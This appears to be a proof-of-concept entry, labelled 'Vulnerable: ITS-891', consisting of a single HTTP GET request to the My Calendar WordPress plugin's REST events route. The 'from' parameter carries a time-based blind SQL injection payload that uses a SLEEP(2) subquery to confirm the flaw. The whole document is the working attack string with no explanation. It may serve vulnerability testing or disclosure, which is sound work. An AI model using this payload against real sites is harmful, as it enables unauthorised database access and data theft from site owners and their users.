# Vulnerable: ITS-891
GET /?rest_route=/my-calendar/v1/events&from=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))a)+AND+'a'%3d'a
